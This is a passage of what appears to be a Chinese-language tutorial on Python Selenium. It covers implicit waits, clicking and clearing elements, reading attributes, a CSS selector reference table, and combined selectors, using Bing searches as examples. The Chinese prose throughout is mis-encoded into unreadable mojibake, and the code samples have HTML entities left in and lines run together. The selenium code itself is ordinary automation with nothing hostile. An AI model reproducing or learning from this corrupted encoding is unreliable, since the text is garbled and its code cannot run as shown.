é‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆç¡®å®šå…·ä½“çš„æ—¶é—´æ˜¯å¤šå°‘, ç¡å¤šé•¿æ—¶é—´æœ€æœ‰æ•ˆç‡å‘¢, æˆ‘ä»¬å¯ä»¥ä½¿ç”¨seleniumç»™æˆ‘ä»¬æä¾›çš„éšå¼ç­‰å¾…ä¹Ÿå°±æ˜¯implicitly_wait()å…¶åŸç†æ˜¯:å½“å‘ç°å…ƒç´ æ²¡æœ‰æ‰¾åˆ°çš„æ—¶å€™,å¹¶ä¸ç«‹å³è¿”å›æ‰¾ä¸åˆ°çš„æŠ¥é”™, è€Œæ˜¯æ¯éš”åŠç§’é’Ÿé‡æ–°å¯»æ‰¾, åœ¨è§„å®šæ—¶é—´å†…ç›´åˆ°æ‰¾åˆ°è¯¥å…ƒç´ , å¦‚æœè¶…å‡ºè§„å®šæ—¶é—´æ‰ä¼šæŠ›å¼‚å¸¸, ()å¡«çš„æ•°å­—å°±æ˜¯æˆ‘ä»¬æ‰€è§„å®šçš„æœ€å¤§ç­‰å¾…æ—¶é—´.ä¹Ÿå¯ä»¥ç”¨ä¸€ä¸²ä»£ç æ¥è§£é‡Šè¿™ä¸ªimplicitly_wait()\nwhile True:    try:        cites = wd.find_elements(By.TAG_NAME, &#x27;cite&#x27;)        for cite in cites:            print(cite.text)        break    except:        time.sleep(0.5)\n\n\nå†æ¥ä½¿ç”¨implicitly_wait()ä¹Ÿå¯ä»¥è¾¾åˆ°åŒæ ·çš„æ•ˆæœ,ä½†æ˜¯ä»£ç ä¼šç®€åŒ–å¾ˆå¤š,è¿™ä¹Ÿå°±æ˜¯pythonçš„å¼ºå¤§ä¹‹å¤„\nfrom selenium import webdriverfrom selenium.webdriver.common.by import  By#from selenium.webdriver.chrome.service import Servicewd = webdriver.Chrome()#service = Service(r&#x27;G:\\tools\\chromedriver\\chromedriver.exe&#x27;))# åˆ›å»º WebDriver å¯¹è±¡ï¼ŒæŒ‡æ˜ä½¿ç”¨chromeæµè§ˆå™¨é©±åŠ¨wd.get(&#x27;https://cn.bing.com/&#x27;)# è°ƒç”¨WebDriver å¯¹è±¡çš„getæ–¹æ³• å¯ä»¥è®©æµè§ˆå™¨æ‰“å¼€æŒ‡å®šç½‘å€elements = wd.find_element(By.ID, &#x27;sb_form_q&#x27;)#é€šè¿‡idé€‰æ‹©ç‰¹å®šå…ƒç´ elements.send_keys(&#x27;Charmersix&#x27;)search = wd.find_element(By.ID, &#x27;search_icon&#x27;)search.click()wd.implicitly_wait(5)cites = wd.find_elements(By.TAG_NAME, &#x27;cite&#x27;)for cite in cites:    print(cite.text)\n\n\næ“æ§å…ƒç´ ç‚¹å‡»å…ƒç´ ç‚¹å‡»å…ƒç´ å‰é¢å·²ç»è®²è¿‡å°±æ˜¯è°ƒç”¨webelementå¯¹è±¡çš„clickæ–¹æ³•\nè¿™é‡Œè¦è¡¥å……çš„æ˜¯, å½“æˆ‘ä»¬è°ƒç”¨webelementå¯¹è±¡çš„clickæ–¹æ³•å»ç‚¹å‡»çš„å…ƒç´ çš„æ—¶å€™, æµè§ˆå™¨æ¥æ”¶åˆ°è‡ªåŠ¨åŒ–å‘½ä»¤, ç‚¹å‡»çš„æ˜¯è¯¥å…ƒç´ çš„ä¸­å¿ƒç‚¹ä½ç½®\nä½†æ˜¯å½“ä¸€äº›æŒ‰é’®çš„æœ‰æ•ˆç‚¹å‡»åŒºåŸŸä¸åœ¨ä¸­é—´çš„æ—¶å€™, æˆ‘ä»¬å°±éœ€è¦é‡æ–°å®šä½åˆ°æœ‰æ•ˆç‚¹å‡»åŒºåŸŸ\nè¾“å…¥æ¡†å‰é¢ä¹Ÿå·²ç»å­¦è¿‡å°±æ˜¯è°ƒç”¨send_keysæ–¹æ³•, ä½†æ˜¯å¦‚æœæˆ‘ä»¬è¾“å…¥æ¡†ä¸­å·²ç»æœ‰å†…å®¹äº†, å°±éœ€è¦å…ˆç”¨ä¸€ä¸ªclearæ–¹æ³•, å°†è¾“å…¥æ¡†ä¸­çš„å†…å®¹æ¸…æ¥šæ‰\næˆ‘ä»¬è¯•ä¸€ä¸‹åœ¨åŸæ¥çš„ä»£ç é‡ŒåŠ å…¥ä¸¤è¡Œ\nelements.clear()elements.send_keys(&#x27;SkyMirror&#x27;)\n\næˆ‘ä»¬ä¼šå‘ç°, æœç´¢æ¡†é‡Œçš„å†…å®¹ä¸å†æ˜¯Charmersixè€Œæ˜¯ç°åœ¨çš„SkyMirror\nè·å–å…ƒç´ ä¿¡æ¯è·å–å…ƒç´ å±æ€§æœ‰ä¸€äº›å…³é”®ä¿¡æ¯å¯èƒ½ä¸æ˜¯æ–‡æœ¬å½¢å¼, æœ‰å¯èƒ½è—åœ¨å…ƒç´ çš„å±æ€§é‡Œ, æ¯”å¦‚è¯´ä¸€äº›æœç´¢æ¡†çš„æç¤ºè¯­æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨get_attribute\nfrom selenium import webdriverfrom selenium.webdriver.common.by import Bywd = webdriver.Chrome()wd.get(&#x27;https://charmersix.icu/search/&#x27;)elements = wd.find_element(By.TAG_NAME,&#x27;input&#x27;)text = elements.get_attribute(&#x27;placeholder&#x27;)print(text)\n\nåƒè¿™æ ·\nè·å–æ•´ä¸ªå…ƒç´ å¯¹åº”çš„HTMLå‡å¦‚æˆ‘ä»¬è¦æå–å¤§æ®µçš„HTMLå†…å®¹, æˆ‘ä»¬å¯ä»¥ä½¿ç”¨elements.get_attribute(&#39;innerHTML&#39;)è·å–æ•´ä¸ªå…ƒç´ çš„HTMLå†…å®¹å’Œelements.get_attribute(&#39;outerHTML&#39;)è·å–æŸå…ƒç´ å†…éƒ¨çš„HTMLå†…å®¹\nè·å–è¾“å…¥æ¡†é‡Œçš„æ–‡å­—å¯¹äºè¾“å…¥æ¡†é‡Œçš„æ–‡æœ¬å†…å®¹ï¼Œç”¨textå±æ€§æ˜¯ä¸è¡Œçš„ï¼Œè¿™æ—¶å€™å¯ä»¥ä½¿ç”¨get_attribute(&#39;value&#39;)\næ¯”æ–¹è¯´, æˆ‘ä»¬åœ¨ä¸Šè¾¹ä»£ç é‡ŒåŠ å…¥ä¸€è¡Œ\nprint(elements.get_attribute(&#x27;value&#x27;))\n\n\næˆ‘ä»¬å°±èƒ½å‘ç°è¿™é‡Œå¯ä»¥è·å–åˆ°æˆ‘ä»¬è¾“å…¥çš„Charmersixå†…å®¹\nè·å–å…ƒç´ æ–‡æœ¬å†…å®¹é€šè¿‡webelementå¯¹è±¡çš„textå±æ€§, å¯ä»¥è·å–å…ƒç´ å±•ç¤ºåœ¨ç•Œé¢ä¸Šçš„æ–‡æœ¬å†…å®¹, ä½†æ˜¯æœ‰æ—¶å€™å…ƒç´ çš„æ–‡æœ¬å†…å®¹æ²¡æœ‰æ˜¾ç¤ºåœ¨ç•Œé¢ä¸Šæˆ–è€…æ²¡æœ‰å®Œå…¨å±•ç¤ºåœ¨ç•Œé¢ä¸Š. è¿™æ—¶å€™ç”¨textå±æ€§å¯èƒ½æ²¡åŠæ³•æ­£å¸¸è·å–æ–‡æœ¬å†…å®¹, å‡ºç°è¿™ç§é—®é¢˜å°è¯•ä½¿ç”¨element.get_attribute(&#39;innerText&#39;)æˆ–è€…element.get_attribute(&#39;textContent&#39;)\nä½¿ç”¨ innerText å’Œ textContent çš„åŒºåˆ«æ˜¯ï¼Œå‰è€…åªæ˜¾ç¤ºå…ƒç´ å¯è§æ–‡æœ¬å†…å®¹ï¼Œåè€…æ˜¾ç¤ºæ‰€æœ‰å†…å®¹ï¼ˆåŒ…æ‹¬displayå±æ€§ä¸ºnoneçš„éƒ¨åˆ†ï¼‰\n\nå¦‚æœæ‚¨äº†è§£webå‰ç«¯å¼€å‘ï¼Œå¯ä»¥çŸ¥æ™“ä¸€ä¸‹ï¼š\nget_attribute è°ƒç”¨æœ¬è´¨ä¸Šå°±æ˜¯è°ƒç”¨ HTMLElement å¯¹åƒçš„å±æ€§\næ¯”å¦‚\nelement.get_attribute(â€˜valueâ€™) ç­‰ä»·äºjsé‡Œé¢çš„ element.value\nelement.get_attribute(â€˜innerTextâ€™) ç­‰ä»·äºjsé‡Œé¢çš„ element.innerText\n\ncssè¡¨è¾¾å¼CSS é€‰æ‹©å™¨åœ¨ CSS ä¸­ï¼Œé€‰æ‹©å™¨æ˜¯é€‰å–éœ€è®¾ç½®æ ·å¼çš„å…ƒç´ çš„æ¨¡å¼ã€‚\nè¯·ä½¿ç”¨æˆ‘ä»¬çš„ CSS é€‰æ‹©å™¨æµ‹è¯•å·¥å…·ï¼Œå®ƒå¯ä¸ºæ‚¨æ¼”ç¤ºä¸åŒçš„é€‰æ‹©å™¨ã€‚\n\n\n\né€‰æ‹©å™¨\nä¾‹å­\nä¾‹å­æè¿°\n\n\n\n.class\n.intro\né€‰æ‹© class=â€introâ€ çš„æ‰€æœ‰å…ƒç´ ã€‚\n\n\n.class1.class2\n.name1.name2\né€‰æ‹© class å±æ€§ä¸­åŒæ—¶æœ‰ name1 å’Œ name2 çš„æ‰€æœ‰å…ƒç´ ã€‚\n\n\n.class1 .class2\n.name1 .name2\né€‰æ‹©ä½œä¸ºç±»å name1 å…ƒç´ åä»£çš„æ‰€æœ‰ç±»å name2 å…ƒç´ ã€‚\n\n\n#id\n#firstname\né€‰æ‹© id=â€firstnameâ€ çš„å…ƒç´ ã€‚\n\n\n*\n*\né€‰æ‹©æ‰€æœ‰å…ƒç´ ã€‚\n\n\nelement\np\né€‰æ‹©æ‰€æœ‰ &lt;p&gt; å…ƒç´ ã€‚\n\n\nelement.class\np.intro\né€‰æ‹© class=â€introâ€ çš„æ‰€æœ‰ &lt;p&gt; å…ƒç´ ã€‚\n\n\nelement,element\ndiv, p\né€‰æ‹©æ‰€æœ‰ &lt;div&gt; å…ƒç´ å’Œæ‰€æœ‰ &lt;p&gt; å…ƒç´ ã€‚\n\n\nelement element\ndiv p\né€‰æ‹© &lt;div&gt; å…ƒç´ å†…çš„æ‰€æœ‰ &lt;p&gt; å…ƒç´ ã€‚\n\n\nelement&gt;element\ndiv &gt; p\né€‰æ‹©çˆ¶å…ƒç´ æ˜¯ &lt;div&gt; çš„æ‰€æœ‰ &lt;p&gt; å…ƒç´ ã€‚\n\n\nelement+element\ndiv + p\né€‰æ‹©ç´§è·Ÿ &lt;div&gt; å…ƒç´ çš„é¦–ä¸ª &lt;p&gt; å…ƒç´ ã€‚\n\n\nelement1~element2\np ~ ul\né€‰æ‹©å‰é¢æœ‰ &lt;p&gt; å…ƒç´ çš„æ¯ä¸ª &lt;ul&gt; å…ƒç´ ã€‚\n\n\n[attribute]\n[target]\né€‰æ‹©å¸¦æœ‰ target å±æ€§çš„æ‰€æœ‰å…ƒç´ ã€‚\n\n\n[attribute=value]\n[target=_blank]\né€‰æ‹©å¸¦æœ‰ target=â€_blankâ€ å±æ€§çš„æ‰€æœ‰å…ƒç´ ã€‚\n\n\n[attribute~=value]\n[title~=flower]\né€‰æ‹© title å±æ€§åŒ…å«å•è¯ â€œflowerâ€ çš„æ‰€æœ‰å…ƒç´ ã€‚\n\n\n[attribute|=value]\n[lang|=en]\né€‰æ‹© lang å±æ€§å€¼ä»¥ â€œenâ€ å¼€å¤´çš„æ‰€æœ‰å…ƒç´ ã€‚\n\n\n[attribute^=value]\na[href^=â€httpsâ€]\né€‰æ‹©å…¶ src å±æ€§å€¼ä»¥ â€œhttpsâ€ å¼€å¤´çš„æ¯ä¸ª &lt;a&gt; å…ƒç´ ã€‚\n\n\n[attribute$=value]\na[href$=â€.pdfâ€]\né€‰æ‹©å…¶ src å±æ€§ä»¥ â€œ.pdfâ€ ç»“å°¾çš„æ‰€æœ‰ &lt;a&gt; å…ƒç´ ã€‚\n\n\n[attribute*=value]\na[href*=â€w3schoolsâ€]\né€‰æ‹©å…¶ href å±æ€§å€¼ä¸­åŒ…å« â€œabcâ€ å­ä¸²çš„æ¯ä¸ª &lt;a&gt; å…ƒç´ ã€‚\n\n\n:active\na:active\né€‰æ‹©æ´»åŠ¨é“¾æ¥ã€‚\n\n\n::after\np::after\nåœ¨æ¯ä¸ª &lt;p&gt; çš„å†…å®¹ä¹‹åæ’å…¥å†…å®¹ã€‚\n\n\n::before\np::before\nåœ¨æ¯ä¸ª &lt;p&gt; çš„å†…å®¹ä¹‹å‰æ’å…¥å†…å®¹ã€‚\n\n\n:checked\ninput:checked\né€‰æ‹©æ¯ä¸ªè¢«é€‰ä¸­çš„ &lt;input&gt; å…ƒç´ ã€‚\n\n\n:default\ninput:default\né€‰æ‹©é»˜è®¤çš„ &lt;input&gt; å…ƒç´ ã€‚\n\n\n:disabled\ninput:disabled\né€‰æ‹©æ¯ä¸ªè¢«ç¦ç”¨çš„ &lt;input&gt; å…ƒç´ ã€‚\n\n\n:empty\np:empty\né€‰æ‹©æ²¡æœ‰å­å…ƒç´ çš„æ¯ä¸ª &lt;p&gt; å…ƒç´ ï¼ˆåŒ…æ‹¬æ–‡æœ¬èŠ‚ç‚¹ï¼‰ã€‚\n\n\n:enabled\ninput:enabled\né€‰æ‹©æ¯ä¸ªå¯ç”¨çš„ &lt;input&gt; å…ƒç´ ã€‚\n\n\n:first-child\np:first-child\né€‰æ‹©å±äºçˆ¶å…ƒç´ çš„ç¬¬ä¸€ä¸ªå­å…ƒç´ çš„æ¯ä¸ª &lt;p&gt; å…ƒç´ ã€‚\n\n\n::first-letter\np::first-letter\né€‰æ‹©æ¯ä¸ª &lt;p&gt; å…ƒç´ çš„é¦–å­—æ¯ã€‚\n\n\n::first-line\np::first-line\né€‰æ‹©æ¯ä¸ª &lt;p&gt; å…ƒç´ çš„é¦–è¡Œã€‚\n\n\n:first-of-type\np:first-of-type\né€‰æ‹©å±äºå…¶çˆ¶å…ƒç´ çš„é¦–ä¸ª &lt;p&gt; å…ƒç´ çš„æ¯ä¸ª &lt;p&gt; å…ƒç´ ã€‚\n\n\n:focus\ninput:focus\né€‰æ‹©è·å¾—ç„¦ç‚¹çš„ input å…ƒç´ ã€‚\n\n\n:fullscreen\n:fullscreen\né€‰æ‹©å¤„äºå…¨å±æ¨¡å¼çš„å…ƒç´ ã€‚\n\n\n:hover\na:hover\né€‰æ‹©é¼ æ ‡æŒ‡é’ˆä½äºå…¶ä¸Šçš„é“¾æ¥ã€‚\n\n\n:in-range\ninput:in-range\né€‰æ‹©å…¶å€¼åœ¨æŒ‡å®šèŒƒå›´å†…çš„ input å…ƒç´ ã€‚\n\n\n:indeterminate\ninput:indeterminate\né€‰æ‹©å¤„äºä¸ç¡®å®šçŠ¶æ€çš„ input å…ƒç´ ã€‚\n\n\n:invalid\ninput:invalid\né€‰æ‹©å…·æœ‰æ— æ•ˆå€¼çš„æ‰€æœ‰ input å…ƒç´ ã€‚\n\n\n:lang(language)\np:lang(it)\né€‰æ‹© lang å±æ€§ç­‰äº â€œitâ€ï¼ˆæ„å¤§åˆ©ï¼‰çš„æ¯ä¸ª &lt;p&gt; å…ƒç´ ã€‚\n\n\n:last-child\np:last-child\né€‰æ‹©å±äºå…¶çˆ¶å…ƒç´ æœ€åä¸€ä¸ªå­å…ƒç´ æ¯ä¸ª &lt;p&gt; å…ƒç´ ã€‚\n\n\n:last-of-type\np:last-of-type\né€‰æ‹©å±äºå…¶çˆ¶å…ƒç´ çš„æœ€å &lt;p&gt; å…ƒç´ çš„æ¯ä¸ª &lt;p&gt; å…ƒç´ ã€‚\n\n\n:link\na:link\né€‰æ‹©æ‰€æœ‰æœªè®¿é—®è¿‡çš„é“¾æ¥ã€‚\n\n\n:not(selector)\n:not(p)\né€‰æ‹©é &lt;p&gt; å…ƒç´ çš„æ¯ä¸ªå…ƒç´ ã€‚\n\n\n:nth-child(n)\np:nth-child(2)\né€‰æ‹©å±äºå…¶çˆ¶å…ƒç´ çš„ç¬¬äºŒä¸ªå­å…ƒç´ çš„æ¯ä¸ª &lt;p&gt; å…ƒç´ ã€‚\n\n\n:nth-last-child(n)\np:nth-last-child(2)\nåŒä¸Šï¼Œä»æœ€åä¸€ä¸ªå­å…ƒç´ å¼€å§‹è®¡æ•°ã€‚\n\n\n:nth-of-type(n)\np:nth-of-type(2)\né€‰æ‹©å±äºå…¶çˆ¶å…ƒç´ ç¬¬äºŒä¸ª &lt;p&gt; å…ƒç´ çš„æ¯ä¸ª &lt;p&gt; å…ƒç´ ã€‚\n\n\n:nth-last-of-type(n)\np:nth-last-of-type(2)\nåŒä¸Šï¼Œä½†æ˜¯ä»æœ€åä¸€ä¸ªå­å…ƒç´ å¼€å§‹è®¡æ•°ã€‚\n\n\n:only-of-type\np:only-of-type\né€‰æ‹©å±äºå…¶çˆ¶å…ƒç´ å”¯ä¸€çš„ &lt;p&gt; å…ƒç´ çš„æ¯ä¸ª &lt;p&gt; å…ƒç´ ã€‚\n\n\n:only-child\np:only-child\né€‰æ‹©å±äºå…¶çˆ¶å…ƒç´ çš„å”¯ä¸€å­å…ƒç´ çš„æ¯ä¸ª &lt;p&gt; å…ƒç´ ã€‚\n\n\n:optional\ninput:optional\né€‰æ‹©ä¸å¸¦ â€œrequiredâ€ å±æ€§çš„ input å…ƒç´ ã€‚\n\n\n:out-of-range\ninput:out-of-range\né€‰æ‹©å€¼è¶…å‡ºæŒ‡å®šèŒƒå›´çš„ input å…ƒç´ ã€‚\n\n\n::placeholder\ninput::placeholder\né€‰æ‹©å·²è§„å®š â€œplaceholderâ€ å±æ€§çš„ input å…ƒç´ ã€‚\n\n\n:read-only\ninput:read-only\né€‰æ‹©å·²è§„å®š â€œreadonlyâ€ å±æ€§çš„ input å…ƒç´ ã€‚\n\n\n:read-write\ninput:read-write\né€‰æ‹©æœªè§„å®š â€œreadonlyâ€ å±æ€§çš„ input å…ƒç´ ã€‚\n\n\n:required\ninput:required\né€‰æ‹©å·²è§„å®š â€œrequiredâ€ å±æ€§çš„ input å…ƒç´ ã€‚\n\n\n:root\n:root\né€‰æ‹©æ–‡æ¡£çš„æ ¹å…ƒç´ ã€‚\n\n\n::selection\n::selection\né€‰æ‹©ç”¨æˆ·å·²é€‰å–çš„å…ƒç´ éƒ¨åˆ†ã€‚\n\n\n:target\n#news:target\né€‰æ‹©å½“å‰æ´»åŠ¨çš„ #news å…ƒç´ ã€‚\n\n\n:valid\ninput:valid\né€‰æ‹©å¸¦æœ‰æœ‰æ•ˆå€¼çš„æ‰€æœ‰ input å…ƒç´ ã€‚\n\n\n:visited\na:visited\né€‰æ‹©æ‰€æœ‰å·²è®¿é—®çš„é“¾æ¥ã€‚\n\n\nCSS_SELECTORHTMLä¸­ç»å¸¸è¦ä¸ºæŸäº›å…ƒç´ æŒ‡å®šæ˜¾ç¤ºæ•ˆæœï¼Œæ¯”å¦‚ å‰æ™¯æ–‡å­—é¢œè‰²æ˜¯çº¢è‰²ï¼Œ èƒŒæ™¯é¢œè‰²æ˜¯é»‘è‰²ï¼Œ å­—ä½“æ˜¯å¾®è½¯é›…é»‘ç­‰ã€‚\né‚£ä¹ˆCSSå¿…é¡»å‘Šè¯‰æµè§ˆå™¨ï¼šè¦ é€‰æ‹©å“ªäº›å…ƒç´  ï¼Œ æ¥ä½¿ç”¨è¿™æ ·çš„æ˜¾ç¤ºé£æ ¼ã€‚ä¾‹å¦‚è¿™ä¸ªç™½æœˆé»‘ç¾½çš„æµ‹è¯•é¡µ\næˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨By.CSS_SELECTORæ¥ç­›é€‰å…ƒç´ \nfrom selenium import webdriverfrom selenium.webdriver.common.by import Bywd = webdriver.Chrome()wd.get(&#x27;https://cdn2.byhy.net/files/selenium/sample1.html&#x27;)elements = wd.find_elements(By.CSS_SELECTOR, &#x27;.animal&#x27;)for i in elements:    print(i.get_attribute(&#x27;outerHTML&#x27;))\n\n\nBy.CSS_SELECTORåŒæ ·å¯ä»¥æ ¹æ®tagåã€id å±æ€§å’Œ classå±æ€§ æ¥ é€‰æ‹©å…ƒç´ ï¼Œ\næ ¹æ® tagå é€‰æ‹©å…ƒç´ çš„ CSS Selector è¯­æ³•éå¸¸ç®€å•ï¼Œç›´æ¥å†™ä¸Štagåå³å¯ï¼Œ\næ ¹æ®idå±æ€§ é€‰æ‹©å…ƒç´ çš„è¯­æ³•æ˜¯åœ¨idå·å‰é¢åŠ ä¸Šä¸€ä¸ªäº•å·ï¼š #idå€¼\næ ¹æ®classå±æ€§ é€‰æ‹©å…ƒç´ çš„è¯­æ³•æ˜¯åœ¨ class å€¼ å‰é¢åŠ ä¸Šä¸€ä¸ªç‚¹ï¼š .classå€¼\næ¯”å¦‚:\nfrom selenium import webdriverfrom selenium.webdriver.common.by import  By#from selenium.webdriver.chrome.service import Servicewd = webdriver.Chrome()#service = Service(r&#x27;G:\\tools\\chromedriver\\chromedriver.exe&#x27;))# åˆ›å»º WebDriver å¯¹è±¡ï¼ŒæŒ‡æ˜ä½¿ç”¨chromeæµè§ˆå™¨é©±åŠ¨wd.get(&#x27;https://cn.bing.com/&#x27;)# è°ƒç”¨WebDriver å¯¹è±¡çš„getæ–¹æ³• å¯ä»¥è®©æµè§ˆå™¨æ‰“å¼€æŒ‡å®šç½‘å€elements = wd.find_element(By.CSS_SELECTOR, &#x27;#sb_form_q&#x27;)#é€šè¿‡idé€‰æ‹©ç‰¹å®šå…ƒç´ elements.send_keys(&#x27;Charmersix&#x27;)search = wd.find_element(By.CSS_SELECTOR, &#x27;#search_icon&#x27;)# print(elements.get_attribute(&#x27;value&#x27;))# elements.clear()# elements.send_keys(&#x27;SkyMirror&#x27;)search.click()wd.implicitly_wait(5)clas = wd.find_element(By.CSS_SELECTOR, &#x27;.b_attribution&#x27;)#clas = wd.find_element(By.CLASS_NAME, &#x27;.b_attribution&#x27;)cites = wd.find_elements(By.CSS_SELECTOR, &#x27;cite&#x27;)for cite in cites:    print(cite.text)\n\n\né€‰æ‹©å­å…ƒç´ å’Œåä»£å…ƒç´ HTMLä¸­, å…ƒç´ å†…éƒ¨å¯ä»¥åŒ…å«å…ƒç´ å…¶ä»–å…ƒç´ , CSS_SELECTORæˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨&gt;æ¥é€‰æ‹©æŸä¸ªå…ƒç´ çš„å­å…ƒç´ , æˆ–è€…é€šè¿‡ä½¿ç”¨ ç©ºæ ¼æ¥é€‰æ‹©æŸå…ƒç´ çš„åä»£å…ƒç´ \næ¯”å¦‚è¯´\nå…ƒç´ 1&gt;å…ƒç´ 2&gt;å…ƒç´ 3\n\nå°±å¯ä»¥æ›´åŠ ç²¾å‡†çš„é€‰æ‹©åˆ°å…ƒç´ ä¸‰\nå½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨\nå…ƒç´ 1 å…ƒç´ 3\n\nä¹Ÿæ˜¯å¯ä»¥é€‰æ‹©åˆ°å…ƒç´ 3çš„\næ¯”å¦‚è¯´, è¿™é‡Œæˆ‘ä»¬æƒ³ç²¾å‡†å®šä½åˆ°æˆ‘çš„è¿™ä¸ªåšå®¢åœ°å€\nfrom selenium import webdriverfrom selenium.webdriver.common.by import  By#from selenium.webdriver.chrome.service import Servicewd = webdriver.Chrome()#service = Service(r&#x27;G:\\tools\\chromedriver\\chromedriver.exe&#x27;))# åˆ›å»º WebDriver å¯¹è±¡ï¼ŒæŒ‡æ˜ä½¿ç”¨chromeæµè§ˆå™¨é©±åŠ¨wd.get(&#x27;https://cn.bing.com/&#x27;)# è°ƒç”¨WebDriver å¯¹è±¡çš„getæ–¹æ³• å¯ä»¥è®©æµè§ˆå™¨æ‰“å¼€æŒ‡å®šç½‘å€elements = wd.find_element(By.CSS_SELECTOR, &#x27;#sb_form_q&#x27;)#é€šè¿‡idé€‰æ‹©ç‰¹å®šå…ƒç´ elements.send_keys(&#x27;Charmersix&#x27;)search = wd.find_element(By.CSS_SELECTOR, &#x27;#search_icon&#x27;)# print(elements.get_attribute(&#x27;value&#x27;))# elements.clear()# elements.send_keys(&#x27;SkyMirror&#x27;)search.click()wd.implicitly_wait(5)#clas = wd.find_element(By.CLASS_NAME, &#x27;.b_attribution&#x27;)cites = wd.find_element(By.CSS_SELECTOR, &#x27;.b_caption&gt;.b_snippet cite&#x27;)print(cites.text)# for cite in cites:#     print(cite.text)\n\n\næ ¹æ®å±æ€§é€‰æ‹©åƒæˆ‘ä»¬è¿™äº›id, classéƒ½æ˜¯æ¯”è¾ƒå¸¸è§çš„, æ‰€ä»¥seleniumæä¾›äº†å›ºå®šçš„ç­›é€‰æ–¹æ³•, ä½†æ˜¯ç½‘é¡µä¸­çš„å±æ€§å…¶å®æ˜¯å¤šç§å¤šæ ·çš„, seleniumä¸å¯èƒ½å…¨éƒ¨è§„å®šå¥½, æ‰€ä»¥, CSS_SELECTORæä¾›äº†å¯ä»¥è‡ªå®šä¹‰å±æ€§çš„æ–¹æ³•, å°±æ˜¯ç”¨[å±æ€§åå­—=å±æ€§å€¼]\næ¯”å¦‚è¿˜æ˜¯ä¸Šé¢çš„ä¾‹å­, æˆ‘ä»¬ä¼šå‘ç°, è¿™ä¸ªç½‘é¡µé‡Œçš„uå±æ€§æ˜¯æ¯”è¾ƒå”¯ä¸€çš„\nä½†æ˜¯, æˆ‘ä»¬åœ¨æµ‹è¯•çš„è¿‡ç¨‹ä¸­åˆä¼šå‘ç°uçš„å€¼ä¼šå˜åŒ–, ä½†æ˜¯æˆ‘ä»¬ä¼šå‘ç°ä¸€ä¸ªè§„å¾‹, uçš„å‰å‡ ä½æ˜¯ä¸€æ ·çš„, è¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨æˆ‘ä»¬çš„æ­£åˆ™è¡¨è¾¾å¼\næ¯”æ–¹è¯´[u^=&quot;1|5090|&quot;]è¡¨ç¤ºå±æ€§å€¼ä»¥1|5090|å¼€å¤´çš„, [u*=&quot;1|5090|&quot;]è¡¨ç¤ºå±æ€§ä¸­å«æœ‰1|5090|çš„, [u$=&quot;1|5090|&quot;]è¡¨ç¤ºä»¥1|5090|ç»“å°¾çš„\nå¦‚æœä¸€ä¸ªå…ƒç´ å…·æœ‰å¤šä¸ªå±æ€§, æˆ‘ä»¬å¯ä»¥ç›´æ¥å¹¶åˆ—è¿™ä¸¤ä¸ªå±æ€§, ç”¨æ¥é€‰æ‹©, åƒè¿™æ ·&#39;[u^=&quot;1|5090|&quot;][tabindex=&quot;0&quot;]&#39;\næˆ‘ä»¬å°±å¯ä»¥æŠŠä»£ç ä¿®æ”¹ä¸ºè¿™æ ·, è¾¾åˆ°ç­›é€‰å‡ºæˆ‘åšå®¢åœ°å€çš„æ•ˆæœ\ncites = wd.find_element(By.CSS_SELECTOR, &#x27;[u^=&quot;1|5090|&quot;][tabindex=&quot;0&quot;]&gt;cite&#x27;)\n\n\néªŒè¯é€‰æ‹©è¯­æ³•ä¼—æ‰€å‘¨çŸ¥, python+seleniumè¿è¡Œé€Ÿåº¦æ˜¯éå¸¸æ…¢çš„, å¦‚æœæˆ‘ä»¬ç¨‹åºæ¯æ¬¡éƒ½é€šè¿‡debugè°ƒè¯•çš„è¯, æ•ˆç‡å¤ªä½. ä½†æ˜¯æˆ‘ä»¬çš„æµè§ˆå™¨F12çš„å¼€å‘è€…å·¥å…·ä¹Ÿæ˜¯æ”¯æŒæˆ‘ä»¬çš„CSS_SELECTORè¯­æ³•çš„like this\nè¿™é‡Œæˆ‘ä»¬æ•…æ„å†™é”™è¯•ä¸€ä¸‹\nè¿™é‡Œå°±ä¼šæ˜¾ç¤º0, é‚£ä¹ˆæˆ‘ä»¬å°±å¾ˆå®¹æ˜“å‘ç°, è¯­æ³•ä¸å¯è¡Œ\né€‰æ‹©è¯­æ³•ç»„åˆä½¿ç”¨ä¸Šé¢å·²ç»æåˆ°è¿‡, æˆ‘ä»¬éœ€è¦åŒæ—¶ç”¨å¤šä¸ªæ¡ä»¶é™åˆ¶çš„æ—¶å€™, ç›´æ¥ä¸¤ä¸ªæ¡ä»¶è´´åœ¨ä¸€èµ·, åƒä¸Šè¾¹å·²ç»æåˆ°è¿‡çš„\n\nå¦‚æœæˆ‘ä»¬æƒ³è¦åŒæ—¶è·å¾—ä¸¤ä¸ªä¸ç›¸å¹²çš„å†…å®¹, æˆ‘ä»¬å¯ä»¥ä½¿ç”¨,æ¥éš”å¼€ä¸¤ä¸ªæ¡ä»¶, æ¯”å¦‚è¯´, è¿™é‡Œæˆ‘æƒ³è¦åŒæ—¶è·å–æˆ‘çš„åå­—å’Œæˆ‘çš„blogåœ°å€\ncites = wd.find_elements(By.CSS_SELECTOR, &#x27;[href=&quot;https://charmersix.icu/&quot;]&gt;strong,[u^=&quot;1|5&quot;][tabindex=&quot;0&quot;]&gt;cite&#x27;)# print(cites.text)for cite in cites:    print(cite.text)\n\n\nçˆ¶å…ƒç´ çš„ç¬¬nä¸ªå­èŠ‚ç‚¹æˆ‘ä»¬å¯ä»¥æŒ‡å®šé€‰æ‹©çš„å…ƒç´ æ˜¯çˆ¶å…ƒç´ çš„ç¬¬å‡ ä¸ªå­èŠ‚ç‚¹\nä½¿ç”¨nth-child\næ¯”å¦‚è¯´, å¦‚æœæˆ‘ä»¬é€‰æ‹©çš„æ˜¯ç¬¬äºŒä¸ªå­å…ƒç´ , å¹¶ä¸”æ˜¯spanç±»å‹, æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿™æ ·å†™\nspan:nth-child(2)\n\nå¦‚æœé€‰æ‹©çš„æ˜¯æ‰€æœ‰ä½ç½®ä¸ºç¬¬äºŒä¸ªçš„æ‰€æœ‰å…ƒç´ , ä¸ç®¡æ˜¯ä»€ä¹ˆç±»å‹, 